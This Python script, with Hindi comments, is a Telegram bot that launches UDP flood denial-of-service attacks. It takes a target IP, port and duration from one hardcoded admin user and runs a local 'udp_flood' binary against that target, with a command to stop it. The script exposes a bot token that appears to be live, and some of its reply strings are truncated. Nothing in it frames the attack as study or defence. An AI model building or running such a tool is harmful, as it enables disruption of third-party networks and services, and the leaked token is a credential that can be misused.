import telebot
import subprocess
import shlex
import os

API_TOKEN = 'YOUR_BOT_TOKEN'
ADMIN_ID = 7899583720        # अपना Telegram ID यहाँ डालें
bot = telebot.TeleBot("8278930868:AAEFn-tRoVH-aP5x8OnxONoUKiq3k6r9rEw")
process = None

@bot.message_handler(commands=['button'])
def start_button(message):
    global process
    if message.from_user.id != 7899583720:
        return

    args = message.text.split()
    if len(args) != 4:
        bot.reply_to(message, "Format: /attack <IP> <PORT> <TIME>")
        return

    ip, port, duration = args[1], args[2], args[3]
    bot.reply_to(message, f"🚀 Attack started on {ip}:{port} for {duration}s")

    try:
        # C बाइनरी को बैकग्राउंड में चलाता है
        cmd = f"./udp_flood {ip} {port} {duration}"
        process = subprocess.Popen(shlex.split(cmd))
    except Exception as e:
        bot.reply_to(message, f"Error: {e}")

@bot.message_handler(commands=['stop'])
def stop_attack(message):
    global process
    if process and process.poll() is None:
        process.terminate()
        bot.reply_to(message, "🛑 At.")
    else:
        bot.reply_to(message, "No .")

bot.polling(none_stop=True)